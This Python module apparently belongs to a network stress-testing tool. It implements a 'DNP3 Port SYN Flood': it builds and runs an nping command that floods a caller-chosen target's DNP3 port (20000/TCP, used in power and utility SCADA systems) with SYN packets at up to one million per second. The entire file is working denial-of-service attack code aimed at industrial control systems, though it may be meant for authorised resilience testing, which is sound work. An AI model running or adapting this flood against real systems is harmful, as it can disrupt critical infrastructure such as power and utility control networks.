"""
測項：DNP3 Port SYN Flood
分類：DNP3（電力/公用事業 SCADA 常用協定，預設埠 20000/TCP）
底層工具：nping
"""
from ..common import run_subprocess, clamp_duration

NAME = "DNP3 Port SYN Flood"
CATEGORY = "DNP3"
PROTOCOL = "TCP"
DEFAULT_PORT = 20000
TEST_TYPE = "traffic"  # 流量型：SYN 半開封包洪水，靠封包速率本身造成負擔


def get_param_schema() -> dict:
    return {
        "rate_pps": {"type": "int", "default": 1000000, "min": 1, "max": 1000000, "desc": "--rate"},
    }


def run(target, port, protocol, duration, params, stop_event, log_fn):
    duration = clamp_duration(duration)
    rate = int(params.get("rate_pps", 5000))
    count = rate * duration

    cmd = [
        "nping", "--tcp", "--flags", "SYN", "-p", str(port),
        "--rate", str(rate), "--count", str(count), "-v", "0", target,
    ]
    return run_subprocess(cmd, duration + 10, stop_event, log_fn)
